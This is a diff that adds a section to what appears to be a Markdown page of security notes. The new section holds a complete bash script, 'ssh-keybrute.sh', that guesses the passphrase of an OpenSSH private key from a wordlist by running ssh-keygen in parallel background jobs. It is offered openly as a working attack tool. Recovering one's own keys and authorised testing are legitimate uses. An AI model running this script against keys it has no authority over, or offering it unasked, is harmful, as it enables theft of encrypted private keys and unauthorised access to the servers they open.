@@ -389,3 +389,40 @@ The response would look like this:
 00000110  2d 4d 61 79 2d 31 32 20  31 35 3a 30 36 20 62 79  |-May-12 15:06 by|
 00000120  20 43 49 42 55                                    | CIBU|
 ```
+
+## >> Brute-forcing OpenSSH private keys in bash
+
+Uses ssh-keygen in multiple background processes to attempt password guesses from a wordlist.  It's not fast, but since there are limited attack tools for this problem it's better than nothing.
+
+Example script `ssh-keybrute.sh`<br />
+```bash
+#!/usr/bin/bash
+
+KEYFILE="/home/user/some_ssh_private_key"
+WORDLIST="/home/user/my_wordlist"
+chmod 600 $KEYFILE
+
+NUMTEST=10
+COUNTER=0
+
+export TMPFILE=$(mktemp /tmp/ssh-keybrute.XXXXXX)
+
+echo "Attempting to crack SSH key password for $KEYFILE"
+echo -e "Each hash mark '#' represents $NUMTEST password attempts.\n"
+
+(while read i; do
+   if [ ! -f $TMPFILE ]; then
+      echo
+      break
+   fi
+   { ssh-keygen -y -f $KEYFILE -P $i 2>/dev/null >&2; if [ $? -eq 0 ]; then echo -e "\npassword = $i"; rm $TMPFILE; fi; } &
+   COUNTER=$(($COUNTER+1))
+   if (( $(($COUNTER%$NUMTEST)) == 0 )); then
+      wait
+      echo -n "#"
+   fi
+   if (( $(($COUNTER%1000)) == 0 )); then
+      echo -n "($COUNTER so far)"
+   fi
+done) <<< $(cat $WORDLIST)
+```
